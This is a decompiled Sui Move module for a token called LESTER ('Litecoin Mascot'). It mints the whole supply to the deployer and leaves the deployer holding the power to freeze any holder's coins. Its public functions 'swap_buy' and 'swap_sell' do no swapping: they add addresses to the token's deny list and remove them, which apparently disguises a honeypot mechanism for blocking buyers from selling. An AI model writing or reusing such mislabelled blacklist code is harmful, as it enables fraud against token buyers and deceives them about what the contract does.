module 0x7d20a27927fb9b5810ec069e03b585880054fad2993fb1d6b0af71ecc2049a96::lester {
    struct LESTER has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: LESTER, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<LESTER>(arg0, 9, b"LESTER", b"Litecoin Mascot", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmTfDueA3iQ2aXhTYSmhXsmJi5zxYdTF2bnzudEips6PbQ"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<LESTER>(&mut v3, 690000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<LESTER>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<LESTER>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<LESTER>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<LESTER>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<LESTER>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<LESTER>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<LESTER>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

